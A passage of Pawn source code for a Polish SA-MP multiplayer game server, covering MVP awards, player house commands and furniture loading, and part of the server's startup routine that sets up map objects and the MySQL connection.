				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}ma najwiêcej zabójstw na serwerze. "C_LOLIVE"+50 EXP", username, givingid); }
			else {
				AddExp(givingid, 50);
   				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}ma najwiêcej zabójstw na serwerze. "C_LOLIVE"+50 EXP", Player[givingid][Name], givingid); }
	    }
	    case 1:
	    {
	        new s[2048], kills, givingid, username[20], exp;
	        m_query("SELECT hours, username, playerid, exp FROM players WHERE playerid > -1 ORDER BY hours DESC LIMIT 1");
     		mysql_store_result();
			mysql_fetch_row(s, " ");
			mysql_free_result();
			sscanf(s, "is[20]ii", kills, username, givingid, exp);
			if(givingid < 0) {
				new score = exp + 50;
			    m_query("UPDATE players SET exp = %d WHERE username = '%s'", score, username);
				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}przegra³ najwiêcej godzin na serwerze. "C_LOLIVE"+50 EXP", username, givingid); }
			else {
				AddExp(givingid, 50);
   				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}przegra³ najwiêcej godzin na serwerze. "C_LOLIVE"+50 EXP", Player[givingid][Name], givingid); }
	    }
	    case 2:
	    {
	        new s[2048], kills, givingid, username[20], exp;
	        m_query("SELECT level, username, playerid, exp FROM players WHERE playerid > -1 ORDER BY level DESC LIMIT 1");
     		mysql_store_result();
			mysql_fetch_row(s, " ");
			mysql_free_result();
			sscanf(s, "is[20]ii", kills, username, givingid, exp);
			if(givingid < 0) {
				new score = exp + 50;
			    m_query("UPDATE players SET exp = %d WHERE username = '%s'", score, username);
				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}ma najwiêkszy poziom. "C_LOLIVE"+50 EXP", username, givingid); }
			else {
				AddExp(givingid, 50);
   				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}ma najwiêkszy poziom. "C_LOLIVE"+50 EXP", Player[givingid][Name], givingid); }
	    }
	    case 3:
	    {
	        new s[2048], kills, givingid, username[20], exp;
	        m_query("SELECT deaths, username, playerid, exp FROM players WHERE playerid > -1 ORDER BY deaths DESC LIMIT 1");
     		mysql_store_result();
			mysql_fetch_row(s, " ");
			mysql_free_result();
			sscanf(s, "is[20]ii", kills, username, givingid, exp);
			if(givingid < 0) {
				new score = exp + 50;
			    m_query("UPDATE players SET exp = %d WHERE username = '%s'", score, username);
				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}ma najwiêcej zgonów na serwerze. "C_LOLIVE"+50 EXP", username, givingid); }
			else {
				AddExp(givingid, 50);
   				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}ma najwiêcej zgonów na serwerze. "C_LOLIVE"+50 EXP", Player[givingid][Name], givingid); }
	    }
	    case 4:
	    {
	        new s[2048], kills, givingid, username[20], exp;
	        m_query("SELECT zabawy, username, playerid, exp FROM players WHERE playerid > -1 ORDER BY zabawy DESC LIMIT 1");
     		mysql_store_result();
			mysql_fetch_row(s, " ");
			mysql_free_result();
			sscanf(s, "is[20]ii", kills, username, givingid, exp);
			if(givingid < 0) {
				new score = exp + 50;
			    m_query("UPDATE players SET exp = %d WHERE username = '%s'", score, username);
				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}wygra³ najwiêcej zabaw. "C_LOLIVE"+50 EXP", username, givingid); }
			else {
				AddExp(givingid, 50);
   				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}wygra³ najwiêcej zabaw. "C_LOLIVE"+50 EXP", Player[givingid][Name], givingid); }
	    }
	    case 5:
	    {
	        new s[2048], kills, givingid, username[20], exp;
	        m_query("SELECT solo, username, playerid, exp FROM players WHERE playerid > -1 ORDER BY solo DESC LIMIT 1");
     		mysql_store_result();
			mysql_fetch_row(s, " ");
			mysql_free_result();
			sscanf(s, "is[20]ii", kills, username, givingid, exp);
			if(givingid < 0) {
				new score = exp + 50;
			    m_query("UPDATE players SET exp = %d WHERE username = '%s'", score, username);
				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}wygra³ najwiêcej pojedynków solo. "C_LOLIVE"+50 EXP", username, givingid); }
			else {
				AddExp(givingid, 50);
   				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}wygra³ najwiêcej pojedynków solo. "C_LOLIVE"+50 EXP", Player[givingid][Name], givingid); }
	    }
	    case 6:
	    {
	        new s[2048], kills, givingid, username[20], exp;
	        m_query("SELECT rud, username, playerid, exp FROM players WHERE playerid > -1 ORDER BY rud DESC LIMIT 1");
     		mysql_store_result();
			mysql_fetch_row(s, " ");
			mysql_free_result();
			sscanf(s, "is[20]ii", kills, username, givingid, exp);
			if(givingid < 0) {
				new score = exp + 50;
			    m_query("UPDATE players SET exp = %d WHERE username = '%s'", score, username);
				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}wydoby³ najwiêcej surowców. "C_LOLIVE"+50 EXP", username, givingid); }
			else {
				AddExp(givingid, 50);
   				format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}wydoby³ najwiêcej surowców. "C_LOLIVE"+50 EXP", Player[givingid][Name], givingid); }
	    }
	}
	SendClientMessageToAll(-1, mvpinfo);
 	m_query("SELECT * FROM privcars");
	mysql_store_result();
	new privcary = mysql_num_rows();
	mysql_free_result();
	if(privcary == 0) return 1;
 	new s[2048], username[20], Float:dist;
 	m_query("SELECT ownername, dist FROM privcars ORDER BY dist DESC LIMIT 1");
	mysql_store_result();
	mysql_fetch_row(s, " ");
	mysql_free_result();
	sscanf(s, "s[20]if", username, dist);
  	new newid, newexp, s2[2048];
	m_query("SELECT playerid, exp FROM players WHERE username = '%s'", username);
	mysql_store_result();
	mysql_fetch_row(s2, " ");
	mysql_free_result();
	sscanf(s2, "ii", newid, newexp);
	if(newid < 0) {
	    m_query("UPDATE players SET exp = %d WHERE username = '%s'", newexp + 50, username);
		format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s {356AFF}ma najwiêcej przebiegu w prywatnym pojeŸdzie. "C_LOLIVE"+20 EXP", username); }
	else {
		AddExp(newid, 50);
   		format(mvpinfo, sizeof(mvpinfo), "{356AFF}*MVP {86B2DF}%s(%d) {356AFF}ma najwiêcej przebiegu w prywatnym pojeŸdzie. "C_LOLIVE"+50 EXP", Player[newid][Name], newid); }
  	SendClientMessageToAll(-1, mvpinfo);
	return 1;
}

CMD:wejdz(playerid, cmdtext[])
{
	if(pData[playerid][InHouse] != INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Jesteœ ju¿ w jakimœ domu.");
	foreach(new i : Houses)
	{
 		if(IsPlayerInRangeOfPoint(playerid, 2.0, HouseData[i][houseX], HouseData[i][houseY], HouseData[i][houseZ]))
   		{
			pData[playerid][PickupHouseID] = i;
			if(HouseData[i][pUID] != -1)
			{
   				switch(HouseData[i][LockMode])
			    {
       				case LOCK_MODE_NOLOCK: SendToHouse(playerid, i);
		        	case LOCK_MODE_PASSWORD: ShowPlayerDialog(playerid, DIALOG_DOM_1, DIALOG_STYLE_INPUT, ""C_BLUE1"Has³o do domu", ""C_WHITE"WprowadŸ has³o, aby wejœæ do tego domu.", "WejdŸ", "Zamknij");
					case LOCK_MODE_OWNER:
     				{
						if(HouseData[i][pUID] == Player[playerid][ID]) SendToHouse(playerid, i);
						else return DialogError(playerid, "{FFFF00}Tylko w³aœciciel mo¿e wchodziæ do tego domu.");
		   			}
	    		}
			}

			break;
		}
	}


	return 1;
}

CMD:wyjdz(playerid, cmdtext[])
{
	if(pData[playerid][InHouse] == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");
	new bool:cos;
	for(new i; i < sizeof(HouseInteriors); ++i)
	{
 		if(IsPlayerInRangeOfPoint(playerid, 2.0, HouseDrzwi[i][0], HouseDrzwi[i][1], HouseDrzwi[i][2]))
   		{
     		SetPlayerPos(playerid, HouseData[pData[playerid][InHouse]][houseX], HouseData[pData[playerid][InHouse]][houseY], HouseData[pData[playerid][InHouse]][houseZ]);
     		SetPlayerVirtualWorld(playerid, 0);
     		SetPlayerInterior(playerid, 0);
       		pData[playerid][InHouse] = INVALID_HOUSE_ID;
       		cos = true;
			break;
   		}
	}
	if(!cos) return SendClientMessage(playerid, RED, "Musisz staæ obok drzwi wejœciowych.");
	return 1;
}

CMD:tpdom(playerid, params[])
{
	new IDx = PosiadaDomek(playerid);
	if(IDx == -1) return SendClientMessage(playerid, RED, "Nie posiadasz swojego domu.");

	TPPlayer(playerid, 0, HouseData[IDx][houseX], HouseData[IDx][houseY], HouseData[IDx][houseZ]);
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Teleportowa³eœ/aœ siê pod swój dom.");
	return 1;
}

CMD:hpwd(playerid, params[])
{
	new IDx = PosiadaDomek(playerid);
	if(IDx == -1) return SendClientMessage(playerid, RED, "Nie posiadasz swojego domu.");

	new inputtext[50];
	if(sscanf(params, "s[50]", inputtext)) return SyntaxError(playerid, "{01FCFF}/hpwd [has³o]");
	if(!(1 <= strlen(inputtext) <= MAX_HOUSE_PASSWORD)) return SendClientMessage(playerid, RED, "Wpisano niedozwolone znaki.");

    format(HouseData[IDx][Password], MAX_HOUSE_PASSWORD, "%s", inputtext);
    SaveHouse(IDx);

 	SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Has³o do domu zmienione pomyœlnie.");
    return 1;
}

CMD:dom(playerid, params[])
{
	new IDx = PosiadaDomek(playerid);
	if(IDx == -1) return SendClientMessage(playerid, RED, "Nie posiadasz swojego domu.");

	ShowHouseMenu(playerid);
	return 1;
}

CMD:hkick(playerid, params[])
{
    if(pData[playerid][InHouse] == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");

    new id, houseid = pData[playerid][InHouse];
	if(HouseData[houseid][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w³aœcicielem ¿adnego domu.");
	if(sscanf(params, "u", id)) return SyntaxError(playerid, "{01FCFF}/hkick [playerid]");
	if(!IsPlayerConnected(id)) return SyntaxError(playerid, "{01FCFF}/hkick [playerid]");
	if(id == playerid) return SyntaxError(playerid, "{01FCFF}/hkick [playerid]");
	if(pData[id][InHouse] != houseid) return SendClientMessageEx(playerid, RED, "Ten gracz nie jest w Twoim domu!", "This player is not in your house!");

//	SetPVarInt(id, "HousePickupCooldown", tickcount()+4000);
	SetPlayerPos(playerid, HouseData[houseid][houseX], HouseData[houseid][houseY], HouseData[houseid][houseZ]);
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
 	pData[id][InHouse] = INVALID_HOUSE_ID;

	SendClientMessageEx(playerid, -1, ""PLUS""C_LOLIVE"Gracz wyrzucony z Twojego domu.", ""PLUS""C_LOLIVE"The player has been kicked from your house.");
	return 1;
}

CMD:freeh(playerid, cmdtext[]) {
	if(Iter_Count(FreeHouses) == 0) return DialogError(playerid, "{FFFF00}Brak wolnych domów.");
    SetPVarInt(playerid, "HouseEnterTick", GetTickCount() + 5000);
	new IDd = Iter_Random(FreeHouses);
	return TPPlayer(playerid, 0, HouseData[IDd][houseX], HouseData[IDd][houseY], HouseData[IDd][houseZ]); }

forward LoadHouses();
public LoadHouses()
{
	new domy = 0, string[4096], houseid = -1, label[256], bool:owned;
    m_query("SELECT ID, HouseName, HouseOwner, HousePassword, HouseX, HouseY, HouseZ, HousePrice, HouseInterior, HouseLock, DomTime, HouseCzynsz FROM houses ORDER BY ID ASC");
	mysql_store_result();
	while(mysql_fetch_row(string))
	{
	    sscanf(string, "p<|>is[4096]", houseid, string);
	    sscanf(string, "p<|>s[48]is[16]fffiiiii", HouseData[houseid][hName], HouseData[houseid][pUID], HouseData[houseid][Password], HouseData[houseid][houseX], HouseData[houseid][houseY], HouseData[houseid][houseZ], HouseData[houseid][Price], HouseData[houseid][Interior], HouseData[houseid][LockMode], HouseData[houseid][DomTime], HouseData[houseid][Czynsz]);

		owned = (HouseData[houseid][pUID] != -1);
  		if(owned) format(label, sizeof(label), ""C_LOLIVE"%s\n"C_NICK"UID w³aœciciela: "C_ORANGE"%d", HouseData[houseid][hName], HouseData[houseid][pUID]);
     	else
	    {
			format(label, sizeof(label), ""C_LOLIVE"Dom na sprzeda¿! (%s$)\n"C_YELLOW"Czynsz za dobê: "C_LOLIVE"%d EXP", convertNumber(HouseData[houseid][Price]), HouseData[houseid][Czynsz]);
            Iter_Add(FreeHouses, houseid);
		}
		HouseData[houseid][HousePickup] = CreateDynamicPickup((owned) ? 1272 : 1273, 1, HouseData[houseid][houseX], HouseData[houseid][houseY], HouseData[houseid][houseZ], 0);
		HouseData[houseid][HouseIcon] = CreateDynamicMapIcon(HouseData[houseid][houseX], HouseData[houseid][houseY], HouseData[houseid][houseZ], (owned) ? 32 : 31, -1, 0, 0, -1, 50.0);
		HouseData[houseid][HouseLabel] = CreateDynamic3DTextLabel(label, 0xFFFFFFFF, HouseData[houseid][houseX], HouseData[houseid][houseY], HouseData[houseid][houseZ]+0.35, 15.0, .worldid = 0, .testlos = 1);
		Iter_Add(Houses, houseid);
//		printf("Dom %d - %s (%d) %.2f %.2f %.2f", id, HouseData[id][Owner], HouseData[id][pUID], HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
		domy++;
    }
 	mysql_free_result();
	printf(" >>> Wczytane domy: %d", domy);
	LoadFurnitures();
	UpdateHouses();
	return 1;
}

forward ZmienInteriorDomku(playerid);
public ZmienInteriorDomku(playerid)
{
	if(pData[playerid][InHouse] == INVALID_HOUSE_ID) return 1;

	new bstrx[1024];
	format(bstrx, sizeof(bstrx), ""C_WHITE"Interior\t"C_BLUE1"||\t"C_WHITE"Cena:\n");
	for(new i; i < sizeof HouseInteriors; i++) {
		format(bstrx, sizeof(bstrx), "%s\n"C_BLUE1"Interior: "C_WHITE"%d\t"C_BLUE1"||\t"C_WHITE"%d$", bstrx, i+1, HouseInteriors[i][PriceInt]); }
	ShowPlayerDialog(playerid, DIALOG_ZMIANA_WNETRZA, DIALOG_STYLE_TABLIST_HEADERS, ""C_BLUE1"Zmiana wnêtrza", bstrx, "Zobacz", "Zamknij");
	return 1;
}

forward UpdateHouses();
public UpdateHouses()
{
	Loop(playerid, MAX_PLAYERS) {
		if(IsPlayerConnected(playerid)) {
			TextDrawShowForPlayer(playerid, SV0);
		TextDrawShowForPlayer(playerid, SV1); } }
	foreach(new i : Houses) {
	    if(HouseData[i][DomTime] == 0) continue;
	   	if(HouseData[i][DomTime] < gettime()) ResetHouse(i); }
	Loop(playerid, MAX_PLAYERS) { if(IsPlayerConnected(playerid)) SetTimerEx("HideSave", 3000, 0, "i", playerid); }
	return 1;
}

forward LoadFurnitures();
public LoadFurnitures()
{
	m_query("SELECT * FROM housefurnitures");
	mysql_store_result();

	new string[290], vw, int;
 	if(mysql_num_rows() > 0)
  	{
  	    new id, data[e_furniture];
		while(mysql_fetch_row(string, "|"))
		{
		    sscanf(string, "p<|>d{ddffffffdd}", data[SQLID]);
		    sscanf(string, "p<|>{d}ddffffffdd", data[HouseID], data[ArrayID], data[furnitureX], data[furnitureY], data[furnitureZ], data[furnitureRX], data[furnitureRY], data[furnitureRZ], vw, int);

			id = CreateDynamicObject(HouseFurnitures[data[ArrayID]][ModelID], data[furnitureX], data[furnitureY], data[furnitureZ], data[furnitureRX], data[furnitureRY], data[furnitureRZ], vw, int);
			Streamer_SetArrayData(STREAMER_TYPE_OBJECT, id, E_STREAMER_EXTRA_ID, data);
 		}
   	}

	mysql_free_result();
	return 1;
}

forward WnetrzeEnd(playerid);
public WnetrzeEnd(playerid)
{
	if(pData[playerid][InHouse] == INVALID_HOUSE_ID) {
		SetPVarInt(playerid, "OgladaWnetrze", 0);
	    return 1; }

	new id = pData[playerid][InHouse];
	if(id == INVALID_HOUSE_ID) return 1;

	new bstrx[3200];

	bstrx = "";
	strcat(bstrx, splitf(""C_ORANGE"Cena wnêtrza: "C_WHITE"%d$\n", HouseInteriors[GetPVarInt(playerid, "WybralWnetrze")][PriceInt]));
	strcat(bstrx, ""C_ORANGE"Czy napewno chcesz kupiæ to wnêtrze?\n");

	new i = GetPVarInt(playerid, "WybralWnetrze");
	if((i < HouseData[id][Interior]))
	{
	    new Zwrot = HouseInteriors[HouseData[id][Interior]][PriceInt] - HouseInteriors[i][PriceInt];
		strcat(bstrx, splitf(""C_ORANGE"Jeœli kupisz to wnêtrze zostanie oddane Ci %d$ poniewa¿ zmieniasz na mniejsze!\n", Zwrot));
	}

	ShowPlayerDialog(playerid, DIALOG_KUPNO_WNETRZA, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Kupno wnêtrza", bstrx, "Kup", "Anuluj");

	return 1;
}

forward BetaInfo();
public BetaInfo() {
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(RED, "{FF0000}OTWARTE BETA TESTY "NAZWA"");
	SendClientMessageToAll(RED, "{FF0000}Statystyki "C_YELLOW"nie bêd¹ {FF0000}zapisywane.");
	SendClientMessageToAll(RED, "{FF0000}B³êdy prosimy zg³aszaæ w "C_YELLOW"/support{FF0000} lub na forum.");
	SendClientMessageToAll(-1, " ");
	SendClientMessageToAll(-1, " "); }

new counts;
public OnGameModeInit()
{
	counts = GetTickCount();
  Beta = false;
	VoteTrwa = false;
  radary = 0;
  CreateRadar(661.49207, 1841.49548, 4.45210,   0.00000, 0.00000, -35.14000);
  CreateRadar(1217.57092, 1868.65601, 5.68930,   0.00000, 0.00000, -175.00000);
  CreateRadar(2151.65259, 306.70648, 32.43350,   0.00000, 0.00000, -100.00000);
  CreateRadar(2833.41675, -1727.36499, 9.86180,   0.00000, 0.00000, 155.00000);
  CreateRadar(2117.82202, -1511.95044, 22.91000,   0.00000, 0.00000, -15.00000);
  CreateRadar(933.22583, -1390.17468, 12.46860,   0.00000, 0.00000, 75.00000);
  CreateRadar(-121.71220, -1200.96851, 1.86470,   0.00000, 0.00000, -45.00000);
  CreateRadar(-958.90076, -331.74896, 35.11500,   0.00000, 0.00000, -30.00000);
  CreateRadar(-1762.45325, 1178.30200, 24.11430,   0.00000, 0.00000, -105.00000);
  CreateRadar(-2818.10083, 612.72528, 5.54120,   0.00000, 0.00000, -15.00000);
  CreateRadar(524.73718, -421.35767, 28.11070,   0.00000, 0.00000, -105.00000);
  CreateRadar(1194.07043, -633.07233, 102.99730,   0.00000, 0.00000, -105.00000);

	format(BlockISP, sizeof(BlockISP), "Brak blokady");

	Create3DTextLabel("_", 0xFFFFFFFF, 0.0, 0.0, -2.0, 0.0, -1);
	Min[RC] = 1;
	Max[RC] = 8;
	Min[CH] = 2;
	Max[CH] = 20;
	Min[RK] = 2;
	Max[RK] = 20;
	Min[SP] = 2;
	Max[SP] = 10;
	Min[DB] = 2;
	Max[DB] = 9;
	Min[GG] = 3;
	Max[GG] = 20;
	Min[BD] = 2;
	Max[BD] = 20;
	Min[TR] = 2;
	Max[TR] = 20;
	Min[BA] = 2;
	Max[BA] = 4;
	ZnajdzkaActive = false;
	ReflexActive = false;
	ServerEvent = false;
	ReflexType = -1;
    UsePlayerPedAnims();
    DisableInteriorEnterExits();
    EnableStuntBonusForAll(0);
 	Streamer_VisibleItems(STREAMER_TYPE_OBJECT, 300);
	Loop(hayid, MAX_HAYS) { IsHayCreated[hayid] = false; }

	for(new x; x != sizeof(StacjePaliw); x++) CreateDynamic3DTextLabel(""C_NICK"Tankowanie prywatnego pojazdu "C_ORANGE"- "C_YELLOW"/tankuj", 0x008080FF, StacjePaliw[x][0], StacjePaliw[x][1], StacjePaliw[x][2], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, -1, -1, 10.0);

	for(new i; i != MAX_HOUSES; ++i)
	{
		HouseData[i][HouseLabel] = Text3D: INVALID_3DTEXT_ID;
		HouseData[i][HousePickup] = -1;
		HouseData[i][HouseIcon] = -1;
	}

	for(new i; i != sizeof(HouseInteriors); ++i)
	{
	    HouseInteriors[i][intLabel] = CreateDynamic3DTextLabel(" ", 0xE67E22FF, HouseDrzwi[i][0], HouseDrzwi[i][1], HouseDrzwi[i][2]+0.35, 10.0, 1, HouseInteriors[i][intID]);
		HouseInteriors[i][intPickup] = CreateDynamicPickup(1318, 1, HouseDrzwi[i][0], HouseDrzwi[i][1], HouseDrzwi[i][2], HouseInteriors[i][intID]);
	}

	Loop(gameid, MAX_GAMES) {
		Osoby[gameid] = 0;
		Wystartowala[gameid] = false;
		Startuje[gameid] = false; }
	Loop(playerid, MAX_PLAYERS) OnGame[playerid] = -1;

	pokemondnia = random(7);

    CreatedNODM = 0;
    CreateNonDM(-1526.4622,-2441.4561,-1213.4259,-2174.9136);
    CreateNonDM(2416.6907,-1693.8945,2441.5283,-1668.9611);
    CreateNonDM(2100.0403,-103.1940,2128.3049,-90.6275);
    CreateNonDM(867.6298,1996.8564,897.6900,2035.2400);
    CreateNonDM(-330.9883,1744.5211,-305.6345,1769.4034);

	Create3DTextLabel("{80bfff}£owisko\n{FF9900}Interakcja: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, 2103.9360,-103.0730,2.2186, 40.0, 0, 0);
	Create3DTextLabel(""C_GREEN"Bank\n"C_LOLIVE"Interakcja: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, 879.8135,2011.1982,10.8254, 25.0, 0, 0);

	Create3DTextLabel(""C_ORANGE"=== "C_BLUE1"/SP "C_ORANGE"===\n{ff0000}Spawn czerwonych", 0x008080FF, 4355.7207,1497.9121,12.6849, 25.0, 111, 0);
	Create3DTextLabel(""C_ORANGE"=== "C_BLUE1"/SP "C_ORANGE"===\n{00aeff}Spawn niebieskich", 0x008080FF, 4310.9463,1536.6780,12.6849, 25.0, 111, 0);

	Create3DTextLabel(""C_YELLOW"Ku pamiêci "C_WHITE"UFO", 0x008080FF, -79.3850,1385.7787,11.3, 25.0, 0, 0);

	CreateActor(59,877.0612,2011.1553,10.8254,273.7419);

    CreatedRandomTP = 0;
    CreateRandomTP(2504.6216,-1668.8967,13.4338);
    CreateRandomTP(-2020.9414,333.7824,35.1645);
    CreateRandomTP(-1956.0208,294.3318,35.4688);
    CreateRandomTP(2121.8608,1001.0126,10.8203);
    CreateRandomTP(2034.1293,-1413.9211,16.9922);
    CreateRandomTP(1873.1091,-1384.3479,13.5397);
	CreateRandomTP(1932.9066,621.7777,10.8303);
	CreateRandomTP(-1854.1526,-91.6064,15.1974);
	CreateRandomTP(-1838.3065,155.8409,15.1172);
	CreateRandomTP(1955.0818,1343.1653,15.4049);
	CreateRandomTP(-305.1185,1746.6633,42.7813);
	CreateRandomTP(2379.0496,1586.2595,10.7919);
	CreateRandomTP(1607.5139,1817.2875,10.8203);
	CreateRandomTP(877.9693,2018.1628,10.8250);
	CreateRandomTP(1401.3358,729.9003,10.8203);
	CreateRandomTP(1393.3484,465.7549,20.1413);
	CreateRandomTP(-1936.6785,883.0844,38.5127);
	CreateRandomTP(-1671.5885,1370.1769,7.1722);
	CreateRandomTP(154.3536,-1941.9010,3.7734);
	CreateRandomTP(75.1948,1211.0209,18.8341);
	CreateRandomTP(-688.4152,938.4912,13.6328);
	CreateRandomTP(-695.2529,260.7811,1.9894);
	CreateRandomTP(199.9452,-107.4814,1.5512);
	CreateRandomTP(1822.6729,-1275.2191,125.7266);
	CreateRandomTP(782.8509,359.2812,19.6301);
	CreateRandomTP(365.1071,2537.8726,16.6660);
	CreateRandomTP(-623.3090,2503.6384,229.0810);
	CreateRandomTP(-2325.1814,-1633.3730,483.7031);
	CreateRandomTP(1264.1260,-1226.0642,202.9061);
	CreateRandomTP(1766.3296,-1797.3033,13.5234);

    Create3DTextLabel("{FFFF00}Pracodawca\n{FF9900}Interakcja: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, 2431.8486,-1679.3871,13.7761, 15.0, 0, 0);
	CreateActor(26,-1387.3243,-2266.7651,38.6946,322.3951);
	CreateActor(165,2431.8486,-1679.3871,13.7761,1.3847);
    Create3DTextLabel("{FFFF00}Górnik\n{FF9900}Interakcja: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, -1387.3243,-2266.7651,38.6946, 15.0, 0, 0);
    Create3DTextLabel("{D760FF}Konsola DJ\n{FF9900}Interakcja: "C_WHITE"Klawisz "C_ORANGE"Y", 0x008080FF, -314.0154,1765.3124,43.9387, 15.0, 0, 0);
 	BDText = Create3DTextLabel(""C_ORANGE"Budynek\n"C_WHITE"["C_LOLIVE"########"C_WHITE"]", 0x008080FF, 2401.233398, 804.473632, 819.270812, 60.0, 89, 0);

 	AT[0] = Create3DTextLabel(""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"", 0x008080FF, 228.9346,148.3944,1004.3961, 40.0, 90, 0);
	AT[1] = Create3DTextLabel(""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"", 0x008080FF, -1043.4052,1041.6085,1342.9799, 70.0, 90, 0);
	AT[2] = Create3DTextLabel(""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"", 0x008080FF, -944.1385,1927.4987,5.0051, 70.0, 90, 0);
	AT[3] = Create3DTextLabel(""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"", 0x008080FF, 1722.2013,-1647.6902,20.2278, 40.0, 90, 0);
	AT[4] = Create3DTextLabel(""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"", 0x008080FF, 1388.0483,-20.7403,1000.9132, 40.0, 90, 0);
	AT[5] = Create3DTextLabel(""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"", 0x008080FF, 2495.9260,-1702.3821,1014.7344, 40.0, 90, 0);
	AT[6] = Create3DTextLabel(""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"", 0x008080FF, -2649.1213,1410.0746,906.2734, 45.0, 90, 0);
 	AT[7] = Create3DTextLabel(""C_ORANGE"Najlepsi gracze areny\n"C_WHITE"", 0x008080FF, 228.9346,148.3944,1004.3961, 40.0, 200, 0);

    gracze = 0;
    vips = 0;
    admins = 0;

	mysql_init(LOG_ONLY_ERRORS, 0);
	new connection;
	connection = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE, MySQL:0, 1);
	if(!connection)
	{
		print("MySQL >> brak po³¹czenia. Wy³¹czanie serwera.");
		SendRconCommand("exit");
		return 1;
	}
	format(configstart, sizeof(configstart), "{424242}");
	format(configstart, sizeof(configstart), "%s© {5e5", configstart);

	SetupStatsTable();
	SetupClansTable();
	SetupVehiclesTable();
	LoadVehicles();
  SetupPartsTable();
	SetupArrowsTable();
  LoadParts();
	LoadArrows();
	SetupParksTable();
	LoadParks();
	SetupPrivcarsTable();
	daily = 0;
	SetupBansTable();
	SetupSpeditionsTable();
	SetupReportsTable();
	SetupSupportTable();
	SetupConnectsTable();
  CreateTD();
//	Loop(classid, 312) { AddPlayerClass(classid, 1783.4507, 2820.4500, 10.8359, 269.15, 0, 0, 0, 0, 0, 0); } 
 	RefreshZabawy();
	RefreshAreny();
	UpdateArenaTOP();
  LosujSarne();

    creatednapady = 0;
    NewNapad("Kasyno Czterech Smoków", 2025.5204,1018.9198,10.8203, 300, "Kasyno czterech smokow");
    NewNapad("The Visage", 2021.9005,1914.6270,12.3211, 300, "The Visage");
    NewNapad("Las Venturas Airport", 1664.2904,1420.8563,10.7894, 400, "Las Venturas Airport");
    NewNapad("Pizzeria w Montgomery", 1365.0367,249.0656,19.5669, 150, "Pizzeria w Montgomery");
    NewNapad("Urz¹d w Los Santos", 1310.2047,-1370.4167,13.5753, 350, "Urzad w Los Santos");
    NewNapad("Doherty", -2029.7665,157.5956,28.8359, 100, "Doherty");
    NewNapad("Wojsko", 120.9972,1905.9871,18.6725, 450, "Wojsko");

	m_query("UPDATE players SET playerid = -1 WHERE playerid > -1");

	gangs = 0;
	gangsdeleted = 0;
	LoadClans();
	wojnatrwa = false;
	gangzones = 0;
	CreateClanZone(2244, -1660.5, 2303, -1605.5);
	CreateClanZone(2244, -1715.5, 2303, -1660.5);
	CreateClanZone(2244, -1770.5, 2303, -1715.5);
	CreateClanZone(2303, -1770.5, 2362, -1715.5);
	CreateClanZone(2303, -1715.5, 2362, -1660.5);
	CreateClanZone(2303, -1660.5, 2362, -1605.5);
	CreateClanZone(2362, -1660.5, 2421, -1605.5);
	CreateClanZone(2362, -1715.5, 2421, -1660.5);
	CreateClanZone(2362, -1770.5, 2421, -1715.5);
	CreateClanZone(2421, -1770.5, 2480, -1715.5);
	CreateClanZone(2421, -1715.5, 2480, -1660.5);
	CreateClanZone(2421, -1660.5, 2480, -1605.5);
	CreateClanZone(2480, -1660.5, 2539, -1605.5);
	CreateClanZone(2480, -1715.5, 2539, -1660.5);
	CreateClanZone(2480, -1770.5, 2539, -1715.5);

	privcars = 0;
	LoadPrivcars();

	SendRconCommand("hostname » [IDM] « •••• Polski Impreza Serwer™ •••• » PL «");
	SendRconCommand("language Polski - PL - Polish");
	SetGameModeText("• Freeroam 2017 •");
	SendRconCommand("weburl "#FORUM"");
	SendRconCommand("mapname "#WERSJA"");
	SendRconCommand("ackslimit 6000");
